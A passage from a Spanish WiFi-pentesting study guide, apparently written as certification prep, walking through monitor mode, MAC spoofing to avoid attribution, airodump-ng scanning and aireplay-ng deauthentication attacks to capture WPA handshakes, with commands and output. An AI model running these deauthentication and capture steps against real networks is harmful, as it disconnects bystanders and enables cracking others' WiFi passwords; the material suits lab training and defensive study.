enseñaros un par de trucos y vectores de ataque que no están de más guardarlos bajo la manga.

#### ¿Qué plan me pillo?

En mi caso me pillé un mes de curso, pero al tercer día de pagarlo me presenté al examen. Para aquellos que no
estén experimentados con la temática WiFi, os puedo decir que con un mes tenéis de sobra, ya que no requiere
tanta dedicación como el OSCP.

Eso sí, hay multitud de comandos y distintos casos, por lo que sobra decir que practicar siempre hay que
practicar. 

En este caso el curso no dispone de laboratorio, por lo que será necesario montarse un laboratorio
en local donde practicar los distintos casos. Para los interesados, todos los laboratorios los monté con un
'**TP-Link**', un simple repetidor desde el cual podía configurar si la red quería que fuera de protocolo WPA
o de protocolo WEP con sus distintos modos de autenticación.

#### ¿Qué bases tuve antes de comenzar con la certificación?

Como dije anteriormente, tenía altamente controlada la parte WiFi, por lo que el estudio de los ataques a
redes WPA y WEP no supuso ningún problema. La guía que te entregan junto a los vídeos están perfectamente
estructurados, y cuentas con todo lo necesario para enfrentarte al examen.

#### ¿Qué pasos me recomiendas para abordar con éxito la certificación?

Recomiendo montar un laboratorio en local para practicar todos los vectores de ataque vistos durante el curso.

Para abordar con éxito la certificación, es necesario que sepas al dedillo cómo manejarte en las siguientes
situaciones, siguiendo como objetivo obtener la contraseña del punto de acceso inalámbrico:

* Ataques a redes WPA con autenticación PSK
* Ataques a redes WEP con clientes sin autenticación SKA
* Ataques a redes WEP con clientes y autenticación SKA
* Ataques a redes WEP sin clientes

Ahora bien, para cada caso, hay distintas formas de efectuar el procedimiento, ya que depende a su vez del
tráfico de la red, la calidad de los paquetes capturados y distintos factores.

#### ¿Cómo está estructurado el examen?

El examen tiene una duración de cuatro horas, te conectas a una máquina por VPN la cual dispone de una tarjeta
de red configurada y a partir de ahí escaneas el entorno.

En el entorno, hay un total de tres puntos de acceso que debes vulnerar, cada uno de ellos representando un
caso diferente. Para aprobar el examen, debes averiguar la contraseña de los tres AP's, pues en caso contrario
no te aprueban.

La gran pregunta, ¿son cuatro horas suficientes?, mi respuesta es más que suficiente. En mi caso en una media
hora aproximada ya había terminado el examen (lo cual me sorprendió). Recomiendo tener todos los comandos
apuntados para cada caso, eso os permitirá ir a tiro hecho.

#### ¿Tuve problemas a la hora de practicar con el laboratorio en local?

Como dije anteriormente, esta certificación no dispone de laboratorio, lo que te obliga a montarte tu propio
laboratorio en local para practicar.

Los únicos ataques que no pude replicar fueron el **Chop Chop de Korek** y el **Fragmentation Attack**,
empleado para redes que no disponen de clientes asociados. Este mismo problema lo he visto en más gente,
leyendo en artículos donde detallaban el mismo inconveniente. Al parecer depende del modelo de router que
tengas. 

En la web de Offensive se cita el modelo a usar para practicar los vectores de ataque, pero como
comprenderéis, no iba a gastar dinero por poder hacer dos ataques. Por lo demás, el resto de ataque los pude
replicar correctamente.

#### ¿Cuáles son los siguientes pasos?

La siguiente certificación que me estoy preparando es el **eWPT**, una certificación de Pentesting Web
bastante valorada y orientada a Bug Bounty. Si me animo puede que mate dos pájaros de un tiro y tras tenerla
pruebe a hacer el **AWAE** de Offensive Security, ya que estaré bien fresco de ideas una vez finalice el otro.

Por si os interesa, el **eWPT** dispone de un plan (que es el que he pagado) que os permite tener un
laboratorio de máquinas de por vida sobre los que practicar Pentesting Web, el cual os actualizan
frecuentemente.

Estructura de los apuntes
===============================================================================================================================

Para facilitar la repartición de apuntes, intuyo que es buena idea dividirlo por un lado en ataques a redes
WPA y por otro lado en ataques a redes WEP con sus distintos casos, ¡así que así lo haremos Mike!

## Redes WPA
Este apartado engloba todos los vectores de ataque y técnicas ofensivas destinadas al protocolo WPA.

### Conceptos básicos

Hay que aclarar una serie de conceptos clave antes de empezar. La mayoría de los ataques que vamos a ver,
además de en ocasiones servir para molestar... van destinados a obtener la contraseña de una red inalámbrica.

El por qué es necesario realizar un ataque para obtener la contraseña es algo que veremos en los siguientes
puntos. Hay que tener en cuenta que al tratarse de una autenticación de tipo PSK (Pre-Shared-Key), se está
haciendo uso de una clave pre-compartida como su nombre indica, una contraseña única que de estar a
disposición de cualquiera puede ser usada para llevar a cabo una asociación contra el AP.

A la hora de llevar a cabo una asociación por una estación (**cliente**) contra el AP, se deja un rastro a
nivel de paquetes (eapol), los cuales como atacante, pueden ser capturados y tratados sin estar autenticados
al punto de acceso para posteriormente extraer la contraseña de la red inalámbrica.

Todo esto explicado de una manera no técnica para no entrar en materia tan rápido, ya a medida que vayamos
avanzando se irá analizando mas a bajo nivel cómo funciona todo :)

### Modo monitor

Hay que pensar que estamos rodeados de paquetes por todos lados, paquetes que no somos capaces de percibir,
paquetes que contienen información del entorno por el que nos movemos. 

Estos paquetes pueden ser capturados con tarjetas de red que acepten el modo monitor. El **modo monitor**, no
es más que un modo por el cual podemos escuchar y capturar todos los paquetes que viajen por el aire. Tal vez
lo mejor de todo es que no sólo podemos capturarlos, sino también manipularlos (veremos algunos ataques
interesantes más adelante).

Para comprobar si nuestra tarjeta de red acepta el modo monitor, haremos una prueba en el siguiente apartado.

### Configuración de la tarjeta de red y tips

Empecemos con un par de comandos básicos. A continuación os listo mi tarjeta de red:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ifconfig wlan0
wlan0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.1.187  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::1d28:6b2b:a941:5796  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether e4:70:b8:d3:93:5d  txqueuelen 1000  (Ethernet)
        RX packets 6426576  bytes 9229384163 (8.5 GiB)
        RX errors 0  dropped 5  overruns 0  frame 0
        TX packets 1160899  bytes 162727829 (155.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Espero que a partir de ahora os llevéis bien con ella, pues con esta practicaremos la mayoría de ataques.

Para poner en modo monitor nuestra tarjeta de red, es tan simple como aplicar el siguiente comando:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #airmon-ng start wlan0

Found 5 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

  PID Name
  818 avahi-daemon
  835 wpa_supplicant
  877 avahi-daemon
 5398 NetworkManager
18308 dhclient

PHY	Interface	Driver		Chipset

phy0	wlan0		iwlwifi		Intel Corporation Wireless 7265 (rev 61)

		(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
		(mac80211 station mode vif disabled for [phy0]wlan0)
```

Ahora bien, cosas a tener en cuenta. Cuando estamos en modo monitor, perdemos conectividad a internet. Este
modo no admite conexión a internet, por lo que no os asustéis si de pronto veis que no podéis navegar. Veremos
cómo deshabilitar este modo para que todo vuelva a la normalidad.

Cabe decir que al iniciar este modo, se generan una serie de **procesos conflictivos**. Esto es así dado que
por ejemplo, si no vamos a tener acceso a internet... ¿por qué tener corriendo los procesos '**dhclient**' y
'**wpa_supplicant**'?, es algo absurdo, e incluso la propia suite nos lo recuerda... pues se encargan de darnos
conectividad y mantenernos con conexión en una red ya estando asociados, lo cual en este caso... no aplica.

Matar estos procesos es sencillo, tenemos la siguiente forma:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #pkill dhclient &amp;&amp; pkill wpa_supplicant
```

O si deseamos tirar de la propia suite:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #airmon-ng check kill

Killing these processes:

  PID Name
  835 wpa_supplicant
```

Ya con esto, nuestra tarjeta de red está en modo monitor. Una forma de comprobar si estamos en modo monitor es
listando nuestras interfaces de red. Ahora nuestra red **wlan0** debería llamarse **wlan0mon**:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ifconfig | grep wlan0 -A 6
wlan0mon: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        unspec E4-70-B8-D3-93-5C-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 63  bytes 12032 (11.7 KiB)
        RX errors 0  dropped 63  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Una vez llegados a este punto, se podría decir que ya somos capaces de capturar todos los paquetes que viajan
por nuestro alrededor, pero dejaremos esto para el siguiente punto.

Importante, ¿cómo desactivar el modo monitor y hacer que todo vuelva a la normalidad en términos de
conectividad?, sencillo. Podemos hacer uso de los siguientes comandos para restablecer la conexión:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #airmon-ng stop wlan0mon &amp;&amp; service network-manager restart

PHY	Interface	Driver		Chipset

phy0	wlan0mon	iwlwifi		Intel Corporation Wireless 7265 (rev 61)

		(mac80211 station mode vif enabled on [phy0]wlan0)

		(mac80211 monitor mode vif disabled for [phy0]wlan0mon)

┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ping -c 10 -i 0.01 -q google.es
PING google.es (172.217.17.3) 56(84) bytes of data.

--- google.es ping statistics ---
10 packets transmitted, 10 received, 0% packet loss, time 309ms
rtt min/avg/max/mdev = 28.718/29.565/29.985/0.427 ms, pipe 3
```

Por lo que fuera malestares y preocupaciones, no hay que tirar el ordenador a la basura. 

Pero esto no es suficiente. A pesar de no estar conectados a ninguna red y no disponer de direccion IP, lo que
en sí puede dejar rastro es nuestra dirección MAC. 

La dirección MAC al fin y al cabo es como el DNI de cada dispositivo, es lo que identifica un dispositivo
móvil, un router, un ordenador, etc. Sería feo estar haciendo cierto tipo de ataques actuando bajo una
dirección MAC que se nos asocie, es lo equivalente a hacer un atraco con pasamontañas pero llevar una cartera
con nuestro DNI dentro del bolsillo y que en un descuido se nos caiga al suelo quedando a la exposición de
todos los demás.

Una buena practica consiste en falsificar la dirección MAC, y no hace falta saber de electrónica o Hardware
para ello. A través de la utilidad **macchanger**, podemos jugar con la dirección MAC de nuestro dispositivo
para manipularla a nuestro antojo.

Por ejemplo, imaginemos que quiero asignar a mi tarjeta de red una dirección MAC de la **NATIONAL SECURITY
AGENCY** (**NSA**), ¿cómo se procedería?. Primero buscamos la dirección MAC en el amplio listado del que
dispone 'macchanger':

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #macchanger -l | grep -i &quot;national security agency&quot;
8310 - 00:20:91 - J125, NATIONAL SECURITY AGENCY
```
Estos tres primeros pares listados corresponden a lo que se conoce como **Organizationally Unique
Identifier**, un simple número de 24 bits que identifica al vendor, manufacturer u otra organización.

Una dirección MAC está compuesta por 6 bytes, ya tenemos los primeros 3 bytes, ¿qué hay de los otros 3 bytes?.
Los 24 bits restantes corresponden a lo que se conoce como **Universally Administered Address**, y sinceramente...
en mis prácticas, siempre me la invento.

Es decir, que si quisiera falsificar una dirección MAC registrada bajo el **OUI** de la NSA, podría hacer lo
siguiente:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ifconfig wlan0mon down
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #echo &quot;$(macchanger -l | grep -i &quot;national security agency&quot; | awk '{print $3}'):da:1b:6a&quot;
00:20:91:da:1b:6a
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #macchanger --mac=$(!!) wlan0mon
Current MAC:   e4:70:b8:d3:93:5c (unknown)
Permanent MAC: e4:70:b8:d3:93:5c (unknown)
New MAC:       00:20:91:da:1b:6a (J125, NATIONAL SECURITY AGENCY)
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ifconfig wlan0mon up
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #macchanger -s wlan0mon
Current MAC:   00:20:91:da:1b:6a (J125, NATIONAL SECURITY AGENCY)
Permanent MAC: e4:70:b8:d3:93:5c (unknown)
```

Aspectos a tener en cuenta de lo anterior:

* Es necesario dar de baja la interfaz de red para manipular su dirección MAC, pues de lo contrario el propio
  'macchanger' nos avisará de que es necesario darla de baja.

* Con la utilidad '--mac', podemos especificar la dirección MAC a utilizar para la interfaz de red
  especificada.

* Una vez aplicados los cambios, damos de alta la interfaz y con el parámetro '-s' (**show**), validamos que
  nuestra tarjeta de red corresponde al **OUI** asignado.

Perfecto, si has llegado a este punto podemos continuar.

### Análisis del entorno

Llega el momento interesante. Ahora que estamos en modo monitor, para capturar todos los paquetes de nuestro
alrededor, podemos hacer uso del siguiente comando:

```bash
airodump-ng wlan0mon
```

**IMPORTANTE**: Aunque tal vez lo debería haber mencionado en el anterior punto, no todas las tarjetas de red
tienen por qué llamarse **wlan0**, pueden tener un nombre distinto (Ej: **wlp2s0**), por lo que habrá que
tener en cuenta su nombre para acompañarlo junto al comando a aplicar.

Al correr el comando citado anteriormente, obtenemos el siguiente resultado:

```bash
 CH 13 ][ Elapsed: 18 s ][ 2019-08-05 13:34                                         
                                                                                                                                                                                       
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -20       19        1    0   1  180  WPA2 CCMP   PSK  hacklab                                                                                                      
 1C:B0:44:D4:16:78  -59       23       13    0  11  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                                
 30:D3:2D:58:3C:6B  -79       29        4    0  11  135  WPA2 CCMP   PSK  devolo-30d32d583c6b                                                                                          
 10:62:D0:F6:F7:D8  -81       15        0    0   6  130  WPA2 CCMP   PSK  LowiF7D3                                                                                                     
 F8:8E:85:DF:3E:13  -85       14        0    0   9  130  WPA  CCMP   PSK  Wlan1                                                                                                        
 FC:B4:E6:99:A9:09  -85       17        0    0   1  130  WPA2 CCMP   PSK  MOVISTAR_A908                                                                                                
 28:9E:FC:0C:40:3E  -90        2        0    0   6  195  WPA2 CCMP   PSK  vodafone4038                                                                                                 
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                        
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -27    0 - 2e     0        1                                
```

Entonces bien, ¿cómo se interpreta este output?. 

De los campos más importantes por el momento, por un lado tenemos el campo **BSSID**, donde siempre podremos
corroborar cuál es la dirección MAC del punto de acceso. Por otro lado, contamos con el campo **PWR**, donde a
modo de consideración, a más cerca esté del valor 0, podremos decir que más cerca nos situamos del AP.

El campo **CH**, indica el canal en el que se sitúa el AP. Cada AP, está posicionado en un canal distinto, con
el objetivo de evitar que se dañe el espectro de onda entre las múltiples redes del entorno. Existe un ataque
justamente de denegación de servicio, que se encarga de generar múltiples Fake AP's situados en el mismo canal
que en el del AP objetivo, consiguiendo así que la red queda inoperativa temporalmente (lo veremos más
adelante).

Por otro lado, los campos **ENC, CIPHER** y **AUTH**, donde podremos comprobar siempre con qué tipo de red
estamos tratando. La mayoría de redes domésticas cumplen la encriptación WPA/WPA, con cifrado CCMP y modo de
autenticación PSK.

En el campo **ESSID**, podremos siempre saber el nombre de la red con la que estamos tratando, pudiendo así en
una misma línea a través del campo **BSSID** saber cuál es su dirección MAC, de utilidad para cuando
comencemos con la fase de filtrado.

El campo **DATA**, por el momento no lo tocaremos, ya que nos meteremos a fondo con este cuando tratemos las
redes de protocolo **WEP**. 

Asimismo, en la parte inferior, podemos ver otros datos que están siendo capturados con la herramienta. Esta
sección corresponde a la de los clientes. Consideraremos una estación como un cliente asociado. Para el
ejemplo mostrado, existe una estación con dirección MAC **34:41:5D:46:D1:38** asociado al **BSSID**
'20:34:FB:B1:C5:53', donde de manera inmediata en la parte superior podemos ver que se trata de la red
**hacklab**, por lo que ya sabemos que dicha red cuenta con un cliente asociado.

Es posible que en ocasiones lleguemos a capturar estaciones que no están asociadas a ningún punto de acceso,
el cual en este caso se indicará con un '**not associated**' en el campo **BSSID**. Es a través del campo
**Frames** de las estaciones, donde podremos ver qué tipo de actividad tiene el cliente sobre dicho AP. Si los
Frames aumentan considerablemente a intervalos cortos de tiempo, esto quiere decir que la estación se
encuentra activa en el momento de la captura.

### Modos de filtro

Aunque es una maravilla poder capturar todos los AP's y estaciones de nuestro entorno, como atacante siempre
nos interesará atentar contra un AP específico. Por ello, introducimos en este punto los modos de filtro
disponibles desde la herramienta para capturar aquellos puntos de acceso deseados.

Volvamos al caso de antes:

```bash
 CH 13 ][ Elapsed: 18 s ][ 2019-08-05 13:34                                         
                                                                                                                                                                                       
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -20       19        1    0   1  180  WPA2 CCMP   PSK  hacklab                                                                                                      
 1C:B0:44:D4:16:78  -59       23       13    0  11  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                                
 30:D3:2D:58:3C:6B  -79       29        4    0  11  135  WPA2 CCMP   PSK  devolo-30d32d583c6b                                                                                          
 10:62:D0:F6:F7:D8  -81       15        0    0   6  130  WPA2 CCMP   PSK  LowiF7D3                                                                                                     
 F8:8E:85:DF:3E:13  -85       14        0    0   9  130  WPA  CCMP   PSK  Wlan1                                                                                                        
 FC:B4:E6:99:A9:09  -85       17        0    0   1  130  WPA2 CCMP   PSK  MOVISTAR_A908                                                                                                
 28:9E:FC:0C:40:3E  -90        2        0    0   6  195  WPA2 CCMP   PSK  vodafone4038                                                                                                 
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                        
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -27    0 - 2e     0        1  
 ```

 Imaginemos que queremos filtrar para que sólo se lista el punto de acceso cuyo **ESSID** es **hacklab**, ¿qué
 podemos recaudar de primeras de esta red?

 * El AP se sitúa en el canal 1
 * El AP posee dirección MAC  20:34:FB:B1:C5:53
 * El AP posee ESSID hacklab

Generalmente con 2 datos ya es suficiente para llevar a cabo el filtro. Para este caso, podríamos filtrar la
red en cuestión de las siguientes formas:

* airodump-ng -c 1 --essid hacklab wlan0mon
* airodump-ng -c 1 --bssid  20:34:FB:B1:C5:53 wlan0mon
* airodump-ng -c 1 --bssid  20:34:FB:B1:C5:53 --essid hacklab wlan0mon

Para cualquiera de las formas representadas, obtendríamos los siguientes resultados:

```bash
 CH  1 ][ Elapsed: 0 s ][ 2019-08-08 20:12                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -26 100       29        7    3   1  180  WPA2 CCMP   PSK  hacklab                                                                                                  
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -26    0e- 6e     0        9                 
```

### Exportación de evidencias

Ahora bien, a efectos prácticos, nos encontramos en la misma situación que al principio. Como atacantes, lo
que nos interesa siempre es recolectar la información del AP objetivo. En este caso, estamos monitorizando el
tráfico del AP **hacklab**, pero sin generar evidencias.

Resulta más interesante capturar y exportar todo el tráfico que se monitorea a un fichero, con el propósito de
posteriormente poder analizarlo. Para ello se hace uso de la misma sintaxis pero incorporando el parámetro
'**-w**', donde seguidamente especificamos el nombre del fichero:

* airodump-ng -c 1 -w Captura --essid hacklab wlan0mon
* airodump-ng -c 1 -w Captura --bssid  20:34:FB:B1:C5:53 wlan0mon
* airodump-ng -c 1 -w Captura --bssid  20:34:FB:B1:C5:53 --essid hacklab wlan0mon

De esta forma, una vez comienza el escaneo, se generan los siguientes ficheros en nuestro directorio de
trabajo:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #ls
Captura-01.cap  Captura-01.csv  Captura-01.kismet.csv  Captura-01.kismet.netxml  Captura-01.log.csv
```
Realmente, de todos estos ficheros, con el que la gran mayoría de veces trabajaremos es con el que tiene
extensión '.cap', esto es así dando que es el que contendrá el ** Handshake** capturado, con el que trataremos
en breve.

### Concepto de Handshake

Por cada vez que una estación se asocia o re-asocia a un AP, durante el proceso de asociación viaja la
contraseña del AP encriptada. A efectos prácticos, se dice siempre que el **Handshake** en estos casos se
genera en el momento en el que un cliente se re-conecta a la red. 

Como estamos monitorizando todo el tráfico de la red en un fichero... viene de maravilla capturar una
re-asociación, pues esta autenticación dejará rastro en nuestra captura y seremos capaces de visualizar la
contraseña encriptada de la red.

Podrías pensar, ¿entonces tengo que quedarme esperando hasta que por X razón una estación se re-asocie al AP?,
no exactamente. Ese tipo de escenario se le consideraría escenario pasivo, pues nosotros como atacantes no
estaríamos interviniendo para manipular el tráfico del AP. 

Existe un escenario activo, el cual pondremos en práctica, donde como atacantes somos capaces de elaborar
externamente sin estar asociados a un AP, un ataque de de-autenticación, consiguiendo así expulsar a uno o
múltiples clientes de una red inalámbrica sin consentimiento.

Un Handshake al fin y al cabo quedará marcado como un Hash, el cual podremos extraer de la captura
posteriormente para iniciar un ataque de fuerza bruta.

### Técnicas para capturar un Handshake

A continuación, se representan distintas técnicas con el propósito de capturar un Handshake de la red fijada
como objetivo.

#### Ataque de deautenticación dirigido

El protocolo IEEE 802.11 (Wi-Fi), contiene la provisión para un **marco de deautenticación**. Como atacantes,
para este ataque lo que haremos será enviar un marco de deautenticación al punto de acceso inalámbrico
objetivo, especificando la dirección MAC del cliente que queremos que sea expulsado de la red.

El proceso de enviar dicho marco al punto de acceso se denomina '**Técnica autorizada para informar a una
estación no autorizada que se ha desconectado de la red**'.

En otras palabras, estaríamos poniendo en práctica el siguiente esquema:

&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6cB.png&quot;&gt;

Para retomar la captura por donde lo habíamos dejado, os vuelvo a representar el caso:

```bash
 CH  1 ][ Elapsed: 0 s ][ 2019-08-08 20:12                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -26 100       29        7    3   1  180  WPA2 CCMP   PSK  hacklab                                                                                                  
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -26    0e- 6e     0        9                 
```

Por tanto, tenemos un cliente **34:41:5D:46:D1:38** asociado al AP **hacklab**. Tratemos de expulsarlo del
punto de acceso. Para expulsar al cliente, haremos uso de la utilidad de **aireplay-ng**.

'**Aireplay-ng**' cuenta con diferentes modos:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #echo; aireplay-ng --help | tail -n 13 | grep -v help | sed '/^\s*$/d' | sed 's/^ *//'; echo

--deauth      count : deauthenticate 1 or all stations (-0)
--fakeauth    delay : fake authentication with AP (-1)
--interactive       : interactive frame selection (-2)
--arpreplay         : standard ARP-request replay (-3)
--chopchop          : decrypt/chopchop WEP packet (-4)
--fragment          : generates valid keystream   (-5)
--caffe-latte       : query a client for new IVs  (-6)
--cfrag             : fragments against a client  (-7)
--migmode           : attacks WPA migration mode  (-8)
--test              : tests injection and quality (-9)
```

Para este caso, nos interesa el parámetro '**-0**', el cual también puede ser usado con el parámetro
'**--deauth**'.

La sintaxis sería la siguiente:

* aireplay-ng -0 10 -e hacklab -c 34:41:5D:46:D1:38 wlan0mon

**CONSIDERACIONES**: Es necesario tener otra consola abierta monitorizando el AP objetivo, pues en caso de no
hacerlo, es probable que el ataque de deautenticación no funcione, pues **aireplay** no sabe sobre qué canal
operar.

Para el comando representado, lo que estamos haciendo es desde nuestro equipo de atacante enviar 10 paquetes
de de-autenticación a la estación objetivo, haciendo así que esta se desasocie de la red. Al igual que se han
especificado 10 paquetes, su valor puede incrementarse al valor deseado. 

Es posible incluso especificar un valor '**0**', haciéndole saber así a **aireplay** que queremos enviar un
número infinito/ilimitado de paquetes de deautenticación a la estación objetivo:

* aireplay-ng -0 0 -e hacklab -c 34:41:5D:46:D1:38 wlan0mon

Esto mismo lo podríamos haber hecho especificando la dirección MAC del AP en vez de su **ESSID**:

* aireplay-ng -0 0 -a 20:34:FB:B1:C5:53 -c 34:41:5D:46:D1:38 wlan0mon

Obteniendo los siguientes resultados:

```bash
┌─[✗]─[root@parrot]─[/home/s4vitar]
└──╼ #aireplay-ng -0 10 -a 20:34:FB:B1:C5:53 -c 34:41:5D:46:D1:38 wlan0mon
20:48:28  Waiting for beacon frame (BSSID: 20:34:FB:B1:C5:53) on channel 1
20:48:29  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [18|65 ACKs]
20:48:29  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [11|63 ACKs]
20:48:30  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
20:48:30  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [14|66 ACKs]
20:48:31  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [17|63 ACKs]
20:48:32  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
20:48:32  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [24|66 ACKs]
20:48:33  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
20:48:33  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
20:48:34  Sending 64 directed DeAuth (code 7). STMAC: [34:41:5D:46:D1:38] [ 0|64 ACKs]
```

Ahora bien, para saber si nuestros paquetes están surtiendo efecto sobre la estación, el truco está en
contemplar el valor izquierdo que figura en los valores situados a la derecha del todo '**[18|65 ACks]**'.
Siempre que este sea mayor que 0, ello querrá decir que nuestros paquetes están siendo enviados correctamente
a la estación.

Si haces estas practicas en local, podrás comprobar cómo tu dispositivo en caso de haber sido la estación
víctima, habría sido desconectado del AP. Por otro lado, aunque lo veremos más adelante, imaginemos que ahora
paramos el ataque, ¿qué creéis que pasaría?. Fijaros que en la mayoría de las veces, los dispositivos tienden
a recordar los puntos de acceso a los que alguna vez han estado conectados. 

Esto es así debido a los paquetes **Probe Request**:

```bash
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ #tshark -i wlan0mon -Y 'wlan.fc.type_subtype==4' 2&gt;/dev/null
   49 1.516614496 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=98, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  242 9.119006178 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=112, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  473 17.062963738 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=126, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  487 17.411192451 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, SN=128, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  511 18.533411763 IntelCor_46:d1:38 → Broadcast    802.11 285 Probe Request, SN=2477, FN=0, Flags=........C, SSID=hacklab
  512 18.552100778 IntelCor_46:d1:38 → Broadcast    802.11 285 Probe Request, SN=2479, FN=0, Flags=........C, SSID=hacklab
  513 18.556049394 IntelCor_46:d1:38 → Broadcast    802.11 278 Probe Request, SN=2480, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  515 18.649006729 Google_71:cf:8c → Broadcast    802.11 195 Probe Request, SN=1719, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  516 18.650498757 Google_71:cf:8c → Broadcast    802.11 208 Probe Request, SN=1720, FN=0, Flags=........C, SSID=MOVISTAR_DF12
  517 18.669117644 Google_71:cf:8c → Broadcast    802.11 195 Probe Request, SN=1721, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
  518 18.670480133 Google_71:cf:8c → Broadcast    802.11 208 Probe Request, SN=1722, FN=0, Flags=........C, SSID=MOVISTAR_DF12
  519 18.691337428 Google_71:cf:8c → Broadcast    802.11 195 Probe Request, SN=1723, FN=0, Flags=........C, SSID=Wildcard (Broadcast)
```

Y es justamente aquí donde está la gracia, pues de parar el ataque, el dispositivo lo que de manera automática
hará será reconectarse al AP, sin nosotros tener que hacer nada. Y es en este momento, donde se generará el Handshake:

```bash
 CH  1 ][ Elapsed: 6 mins ][ 2019-08-08 20:54 ][ WPA handshake: 20:34:FB:B1:C5:53                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  -28 100     3564      684    2   1  180  WPA2 CCMP   PSK  hacklab                                                                                                  
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 (not associated)   24:A2:E1:48:66:14  -87    0 - 1      0        5                                                                                                                     
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  -19    0e- 6e     0     2538  hacklab
 ```

 Si nos fijamos, en la parte superior, la propia suite nos indica **WPA handshake** seguido de la dirección
 MAC del AP, debido a que se ha capturado el Handshake correspondiente al cliente que hemos deautenticado y
 que se acaba de reasociar.

 Jugaremos con el Handshake más adelante, veamos primero otras formas de obtener el Handshake.

 #### Ataque de deautenticación global

 Imaginemos ahora que estamos en un bar, un bar lleno de gente con un punto de acceso del propio
 establecimiento. En estos casos, cuando una red dispone de tantos clientes asociados, es más factible lanzar
 otro tipo de ataque, el **ataque de deautenticación global**.

 A diferencia del ataque de deautenticación dirigido, en el ataque de deautenticación global, se hace uso de
 una **Broadcast MAC Address** como dirección MAC de estación objetivo a utilizar. Lo que conseguimos con esta
